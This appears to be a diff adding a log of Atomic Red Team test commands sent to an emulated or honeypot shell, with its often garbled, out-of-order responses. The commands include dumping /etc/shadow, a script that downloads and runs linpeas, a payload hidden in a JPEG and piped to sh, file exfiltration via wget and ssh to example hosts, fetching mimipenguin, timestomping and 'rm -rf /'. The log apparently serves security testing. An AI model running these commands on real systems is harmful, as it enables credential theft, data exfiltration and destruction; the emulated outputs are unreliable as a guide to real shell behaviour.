@@ -1,0 +1,3711 @@
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:awk 'BEGIN {system("/bin/sh &")}'
+response:awk 'BEGIN {system("/bin/sh &")}'
+bash: awk: command not found
+root@svr04:~# 
+
+action:
+command:busybox sh &
+response:busybox sh &
+root@svr04:~# 
+
+action:
+command:pip install requests
+response:pip install requests
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:echo '#!/bin/sh' > /tmp/T1003.007.sh
+response:echo '#!/bin/sh' > /tmp/T1003.007.sh
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
+response:echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
+bash: PERL_MM_USE_DEFAULT=1: command not found
+root@svr04:~# Blocked command!
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+
+
+action:
+command:if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+
+
+action:
+command:if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
+
+
+action:
+command:if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
+
+
+action:
+command:if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
+
+
+action:
+command:cat /etc/group
+response:cat /etc/group
+
+
+action:
+command:pip install requests    
+response:pip install requests    
+
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+
+
+action:
+command:echo 'import requests' > T1059.006.py
+response:echo 'import requests' > T1059.006.py
+
+
+action:
+command:echo 'import os' >> T1059.006.py
+response:echo 'import os' >> T1059.006.py
+
+
+action:
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+
+
+action:
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+
+
+action:
+command:echo 'session = requests.session()' >> T1059.006.py
+response:echo 'session = requests.session()' >> T1059.006.py
+
+
+action:
+command:echo 'source = session.get(url).content' >> T1059.006.py
+response:echo 'source = session.get(url).content' >> T1059.006.py
+
+
+action:
+command:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+response:echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
+
+
+action:
+command:echo 'fd.write(source)' >> T1059.006.py
+response:echo 'fd.write(source)' >> T1059.006.py
+
+
+action:
+command:echo 'fd.close()' >> T1059.006.py
+response:echo 'fd.close()' >> T1059.006.py
+
+
+action:
+command:echo 'os.system(malicious_command)' >> T1059.006.py
+response:echo 'os.system(malicious_command)' >> T1059.006.py
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:sudo cat /etc/shadow > /tmp/T1003.008.txt
+response:sudo cat /etc/shadow > /tmp/T1003.008.txt
+
+
+action:
+command:cat /tmp/T1003.008.txt
+response:cat /tmp/T1003.008.txt
+
+
+action:
+command:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+response:tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'
+bash: openssl: command not found
+root@svr04:~# 
+
+action:
+command:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+Blocked command!
+bash: xxd: command not found
+Blocked command!
+bash: base64: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:echo "[Unit]" > /etc/systemd/system/art-timer.service
+response:echo "[Unit]" > /etc/systemd/system/art-timer.service
+Blocked command!
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+bash: [: command not found
+root@svr04:~# 
+
+action:
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+bash: if: command not found
+bash: then: command not found
+bash: python3: command not found
+Blocked command!
+
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:root@svr04:~# who -a
+Blocked command!
+root     pts/0        2025-03-13 09:59 (192.168.101.20)
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+bash: [: command not found
+root@svr04:~# 
+
+action:
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+bash: if: command not found
+bash: then: command not found
+bash: python3: command not found
+
+
+action:
+command:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+response:if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
+Blocked command!
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
+response:which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
+Blocked command!
+bash: apt: command not found
+bash: apt: command not found
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+Blocked command!
+bash: base64: command not found
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo ""
+response:echo ""
+
+
+action:
+command:PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+response:PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+bash: syntax error: unexpected end of file
+root@svr04:~# 
+
+action:
+command:echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+response:echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+
+
+action:
+command:tail /var/log/syslog
+response:tail /var/log/syslog
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+
+
+action:
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:root@svr04:~# if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+Blocked command!
+chmod: cannot access x: No such file or directory
+chmod: cannot access sqlite_dump.sh: No such file or directory
+root@svr04:~# 
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+bash: xxd: command not found
+Blocked command!
+bash: base64: command not found
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:wget --post-file="/home/atomic/T1048.002/src/artifact" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+response:wget --post-file="/home/atomic/T1048.002/src/artifact" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+
+
+action:
+command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+response:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+bash: if: command not found
+bash: then: command not found
+bash: else: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:chmod +x sqlite_dump.sh
+response:chmod +x sqlite_dump.sh
+chmod: cannot access x: No such file or directory
+chmod: cannot access sqlite_dump.sh: No such file or directory
+root@svr04:~# 
+
+action:
+command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+response:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+bash: find: command not found
+root@svr04:~# 
+
+action:
+command:wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+response:wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after
+Unrecognized option
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+Blocked command!
+Active Internet connections (w/o servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0    308 svr04:ssh               192.168.101.20:35132    ESTABLISHED
+Active UNIX domain sockets (only servers)
+Proto RefCnt Flags       Type       State         I-Node   Path
+unix  4      [ ]         DGRAM                    7445     /dev/log
+unix  3      [ ]         STREAM     CONNECTED     7323
+unix  3      [ ]         STREAM     CONNECTED     7348     /var/run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     7330
+unix  2      [ ]         DGRAM                    8966
+unix  3      [ ]         STREAM     CONNECTED     7424     /var/run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     7140
+unix  3      [ ]         STREAM     CONNECTED     7145     @/com/ubuntu/upstart
+unix  3      [ ]         DGRAM                    7199
+unix  3      [ ]         STREAM     CONNECTED     7347
+unix  3      [ ]         STREAM     CONNECTED     8594
+unix  3      [ ]         STREAM     CONNECTED     7331
+unix  3      [ ]         STREAM     CONNECTED     7364     @/com/ubuntu/upstart
+unix  3      [ ]         STREAM     CONNECTED     7423
+unix  3      [ ]         DGRAM                    7198
+unix  2      [ ]         DGRAM                    9570
+unix  3      [ ]         STREAM     CONNECTED     8619     @/com/ubuntu/upstart
+root     pts/0        2025-03-13 10:07 (192.168.101.20)
+root@svr04:~# 
+
+action:
+command:mkdir -p /tmp/victim-folder
+response:mkdir -p /tmp/victim-folder
+root@svr04:~# 
+
+action:
+command:rm -rf /tmp/victim-folder
+response:rm -rf /tmp/victim-folder
+root@svr04:~# 
+
+action:
+command:mkdir -p /tmp/victim-folder
+response:mkdir -p /tmp/victim-folder
+mkdir: cannot create directory `/root/-p': File exists
+root@svr04:~# 
+
+action:
+command:rm -rf /tmp/victim-folder
+response:rm -rf /tmp/victim-folder
+
+
+action:
+command:pip install requests    
+response:pip install requests    
+bash: pip: command not found
+root@svr04:~# 
+
+action:
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:which_python=$(which python || which python3 || which python3.9 || which python2)
+bash: $: command not found
+
+
+action:
+command:echo 'import requests' > T1059.006.py
+response:echo 'import requests' > T1059.006.py
+Blocked command!
+Blocked command!
+Blocked command!
+
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install systemd on the machine."; exit 1;
+response:echo "Install systemd on the machine."; exit 1;
+Blocked command!
+
+
+action:
+command:whoami
+response:whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:ps >> /tmp/loot.txt
+response:ps >> /tmp/loot.txt
+
+
+action:
+command:ps aux >> /tmp/loot.txt
+response:ps aux >> /tmp/loot.txt
+
+
+action:
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+bash: [: command not found
+root@svr04:~# 
+
+action:
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+bash: if: command not found
+bash: then: command not found
+bash: python3: command not found
+Blocked command!
+
+
+action:
+command:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:
+
+action:
+command:wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+response:cat "/home/atomic/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomic/image.jpg" - > "/home/atomic/evil_image.jpg"; strings "/home/atomic/evil_image.jpg" | tail -n 1 | base64 -d | sh
+bash: fi: command not found
+bash: xxd: command not found
+Blocked command!
+bash: base64: command not found
+root@svr04:~# wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+wget: /root/"/tmp/mimipenguin.tar.gz": Cannot open: No such file or directory
+root@svr04:~# 
+
+action:
+command:mkdir /tmp/mimipenguin
+response:mkdir /tmp/mimipenguin
+root@svr04:~# 
+
+action:
+command:whoami
+response:whoami
+root
+root@svr04:~# 
+
+action:
+command:[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
+response:[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
+bash: [: command not found
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: chflags: command not found
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+bash: cd: $: No such file or directory
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+Blocked command!
+root
+root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+root
+root@svr04:~# 
+
+action:
+command:mkdir -p /tmp/victim-files/ && touch /tmp/victim-files/T1070.004-test.txt
+response:mkdir -p /tmp/victim-files/ && touch /tmp/victim-files/T1070.004-test.txt
+touch: cannot touch `/tmp/victim-files/T1070.004-test.txt`: no such file or directory
+root@svr04:~# 
+
+action:
+command:rm -f /tmp/victim-files/T1070.004-test.txt
+response:rm -f /tmp/victim-files/T1070.004-test.txt
+rm: cannot remove `/tmp/victim-files/T1070.004-test.txt': No such file or directory
+root@svr04:~# 
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:root@svr04:~# who -a
+
+
+action:
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+bash: if: command not found
+bash: then: command not found
+bash: apt: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+bash: if: command not found
+bash: then: command not found
+bash: yum: command not found
+bash: fi: command not found
+root@svr04:~# 
+
+action:
+command:cd $HOME
+response:cd $HOME
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+Blocked command!
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+b'curl: Remote file name has no length!\n'root@svr04:~# 
+
+action:
+command:whoami
+response:root@svr04:~# whoami
+
+
+action:
+command:echo "Install netstat on the machine."; exit 1;
+response:echo "Install netstat on the machine."; exit 1;
+
+
+action:
+command:netstat
+response:netstat
+
+
+action:
+command:who -a
+response:who -a
+
+
+action:
+command:echo missing ldapsearch command; exit 1
+response:echo missing ldapsearch command; exit 1
+
+
+action:
+command:ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn 
+response:ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b "CN=Users,DC=example,DC=com" "(objectClass=group)" -s sub -a always -z 1000 dn 
+
+
+action:
+command:mkdir -p /tmp/victim-folder
+response:mkdir -p /tmp/victim-folder
+
+
+action:
+command:rm -rf /tmp/victim-folder
+response:rm -rf /tmp/victim-folder
+
+
+action:
+command:echo 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt
+response:echo 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt
+
+
+action:
+command:touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
